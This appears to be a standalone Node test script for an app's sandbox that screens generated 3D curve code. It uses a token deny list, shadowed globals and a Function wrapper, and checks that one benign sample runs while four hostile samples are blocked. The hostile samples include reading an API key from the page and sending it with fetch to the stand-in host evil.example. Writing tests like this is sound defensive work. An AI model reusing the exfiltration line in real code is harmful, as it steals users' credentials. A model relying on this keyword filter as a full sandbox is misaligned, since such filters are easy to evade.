// Standalone replica of the in-app sandbox scan+wrapper.
// Run: node verify_sandbox.mjs
// Must print: benign ALLOWED, and steal-key/exfil/eval/window BLOCKED.

const FORBIDDEN_SCAN = ['window','document','fetch','eval','Function','globalThis','importScripts','XMLHttpRequest','localStorage','sessionStorage','indexedDB','location','top','parent','self','navigator','alert','import','require','process','setTimeout','setInterval','postMessage','addEventListener','WebSocket','Worker','constructor','__proto__','prototype','delete','with'];
// NOTE: eval/arguments intentionally ABSENT here (strict-mode `var eval;` SyntaxError).
const SHADOW_IDENTS = ['window','document','fetch','Function','globalThis','importScripts','XMLHttpRequest','localStorage','sessionStorage','indexedDB','location','top','parent','self','navigator','alert','require','process','setTimeout','setInterval','postMessage','addEventListener','WebSocket','Worker','constructor','__proto__','prototype'];

const helpers = { lathe:(pts,seg,p,r,c)=>{ if(!Array.isArray(pts)) throw new Error('lathe needs array'); }, addBox:()=>{}, sin:Math.sin, cos:Math.cos, PI:Math.PI };

function runSandboxedCurveCode(code, helpers) {
  let c = (code || '').trim();
  const fence = c.match(/```(?:js|javascript)?\s*([\s\S]*?)```/i); if (fence) c = fence[1].trim();
  for (const t of FORBIDDEN_SCAN) { if (new RegExp('\\b'+t+'\\b').test(c)) throw new Error('Sandbox blocked token: '+t); }
  const keys = Object.keys(helpers);
  const shadow = 'var '+SHADOW_IDENTS.join(',')+';';
  const wrapped = '"use strict";\n'+shadow+'\n'+c;
  const fn = new Function(keys.join(','), wrapped); fn(...keys.map(k=>helpers[k]));
}

function tryRun(label, code) {
  try { runSandboxedCurveCode(code, helpers); console.log(label, '=> ALLOWED'); }
  catch (e) { console.log(label, '=> BLOCKED:', e.message); }
}

tryRun('benign lathe', `const pts=[]; for(let i=0;i<=12;i++){const t=i/12; pts.push([2-t*0.6, t*1.5]);} lathe(pts, 32, [0,0,0],[0,0,0], "#cbd5e1");`);
tryRun('steal key', `const k=document.getElementById('api-key').value; addBox([1,1,1]);`);
tryRun('exfil fetch', `fetch('https://evil.example/'+document.getElementById('api-key').value);`);
tryRun('eval', `eval('addBox([1,1,1])');`);
tryRun('window', `window.location='https://evil.example';`);
